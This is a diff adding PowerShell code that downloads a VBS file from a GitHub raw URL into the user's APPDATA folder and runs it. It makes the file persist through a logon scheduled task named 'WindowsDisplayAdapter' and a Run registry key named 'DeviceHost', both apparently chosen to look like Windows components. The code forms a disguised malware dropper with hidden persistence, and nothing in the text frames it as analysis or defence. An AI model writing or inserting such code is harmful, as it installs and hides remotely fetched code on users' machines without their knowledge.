@@ -74,4 +74,48 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 
 
 
+# Download the VBS file 
+try {
+    $startupPath = "$env:APPDATA\file.vbs"
+    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
+    Write-Host "VBS file downloaded."
+} catch {
+    Write-Host "Failed to download VBS file: $_"
+}
+
+# === Konfiguration ===
+$TaskName  = 'WindowsDisplayAdapter'
+$ScriptPath = "$env:APPDATA\file.vbs"
+
+try {
+
+    if (-not (Test-Path $ScriptPath)) {
+    }
+
+    # Aufgabe definieren
+    $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -File `"$ScriptPath`""
+    $trigger  = New-ScheduledTaskTrigger -AtLogOn
+    $settings = New-ScheduledTaskSettingsSet
+    $task     = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
+
+    Register-ScheduledTask -TaskName $TaskName -InputObject $task -User $env:USERNAME -Force
+
+
+    # Sofortiger Teststart
+    Start-Process powershell.exe -ArgumentList "-NoProfile -File `"$ScriptPath`""
+}
+catch {
+    Write-Host "FEHLER: $($_.Exception.Message)"
+}
+
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                 -Name "DeviceHost" `
+                 -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
+
+
+
+
+
+
+
 
